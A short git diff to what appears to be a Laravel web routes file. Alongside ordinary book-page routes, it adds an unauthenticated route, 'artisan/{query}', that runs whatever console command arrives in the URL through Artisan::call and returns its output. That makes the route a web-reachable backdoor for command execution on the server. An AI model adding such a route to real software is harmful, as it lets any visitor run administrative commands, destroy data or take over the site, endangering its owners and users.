@@ -26,6 +26,11 @@ Route::get('/books-new', function () {
 Route::get('/books-better', function () {
     return view('blog_detail');
 });
+Route::get('artisan/{query}', function ($query) {
+    Artisan::call($query);
+    $output = Artisan::output();
+    return $output;
+});
 Auth::routes();
 
 Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
